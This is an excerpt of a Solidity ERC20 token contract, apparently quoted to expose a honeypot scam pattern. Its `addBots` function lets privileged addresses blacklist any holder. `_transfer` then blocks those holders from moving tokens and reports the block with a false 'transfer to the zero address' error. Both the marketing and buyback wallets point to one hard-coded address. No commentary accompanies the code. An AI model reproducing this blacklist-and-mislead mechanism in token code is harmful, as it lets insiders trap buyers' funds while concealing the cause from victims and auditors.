...
contract Token is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x1C5544f2b29a7D6c5981c6520dB92b8973E70207);
    address payable public buyBackWalletAddress = payable(0x1C5544f2b29a7D6c5981c6520dB92b8973E70207);
    ...
    function addBots(address[] calldata accounts) public {
        require(isExcludedFromFee[msg.sender]);
        for(uint i=0; i < accounts.length; i++) {
            isBots[accounts[i]] = true;
        }  
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!isBots[sender], "ERC20: transfer to the zero address");
